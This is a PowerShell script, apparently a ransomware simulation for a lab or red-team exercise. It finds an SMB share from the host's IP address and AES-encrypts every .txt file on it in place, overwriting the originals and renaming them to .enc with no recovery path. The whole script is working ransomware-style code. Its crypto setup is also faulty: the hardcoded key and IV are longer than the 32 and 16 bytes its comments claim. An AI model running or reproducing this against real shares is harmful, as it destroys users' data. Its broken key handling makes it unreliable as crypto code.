# Function to capture the third octet of the IP address
function Get-ThirdOctet {
    # Get the IP address of the host (local machine in this case)
    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixLength -eq 24 }).IPAddress

    # Check if the IP address is found
    if ($ipAddress) {
        # Split the IP address into its components (octets)
        $ipParts = $ipAddress -split '\.'

        # Ensure we have enough parts (4 octets)
        if ($ipParts.Length -eq 4) {
            # Return the third octet
            return $ipParts[2]
        } else {
            Write-Host "Invalid IP address format" -ForegroundColor Red
            return $null
        }
    } else {
        Write-Host "No IPv4 address found" -ForegroundColor Red
        return $null
    }
}

# Capture the third octet of the IP address
$thirdOctet = Get-ThirdOctet

# Check if the third octet was successfully retrieved
if ($null -eq $thirdOctet) {
    Write-Host "Failed to retrieve third octet. Exiting." -ForegroundColor Red
    exit
}

# Modify the SMB share path dynamically with the third octet
$smbSharePath = "\\10.242.${thirdOctet}.62\share"  # Modify the path with the third octet

# Define AES encryption parameters (AES-256, 32-byte key)
$key = [System.Text.Encoding]::UTF8.GetBytes("ThisIsA32ByteLongKeyForAES256Encryption!")  # 32-byte key for AES-256
$iv = [System.Text.Encoding]::UTF8.GetBytes("RandomInitVector123!")  # 16-byte initialization vector

# Create AES encryption object
$aes = [System.Security.Cryptography.AesManaged]::new()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

# Get all text files in the SMB share directory (adjust the file filter if needed)
$files = Get-ChildItem -Path $smbSharePath -Filter "*.txt"

# Check if there are any files
if ($files.Count -eq 0) {
    Write-Host "No .txt files found in the specified SMB share." -ForegroundColor Red
    exit
}

# Function to encrypt data using AES and simulate ransomware attack
function Encrypt-FileContent {
    param (
        [string]$filePath
    )

    # Read the content of the file
    $content = Get-Content -Path $filePath -Raw

    # Convert content to bytes
    $contentBytes = [System.Text.Encoding]::UTF8.GetBytes($content)

    # Create a memory stream to hold encrypted data
    $ms = New-Object System.IO.MemoryStream

    # Create a CryptoStream for encryption
    $cs = New-Object System.Security.Cryptography.CryptoStream $ms, $aes.CreateEncryptor(), 'Write'

    # Write the content to the CryptoStream (encrypting as it goes)
    $cs.Write($contentBytes, 0, $contentBytes.Length)
    $cs.Close()

    # Get the encrypted byte array
    $encryptedBytes = $ms.ToArray()

    # Write encrypted data back to the file (overwriting the original content)
    Set-Content -Path $filePath -Value ($encryptedBytes)

    # Rename the file to simulate ransomware encryption (change extension to .enc)
    $newFilePath = $filePath + ".enc"
    Rename-Item -Path $filePath -NewName $newFilePath

    Write-Host "Encrypted and renamed: $newFilePath" -ForegroundColor Yellow
}

# Encrypt each file in the SMB share directory
foreach ($file in $files) {
    try {
        Encrypt-FileContent -filePath $file.FullName
    }
    catch {
        Write-Host "Error encrypting $($file.FullName): $_" -ForegroundColor Red
    }
}

Write-Host "Ransomware simulation complete. All files encrypted and renamed." -ForegroundColor Green
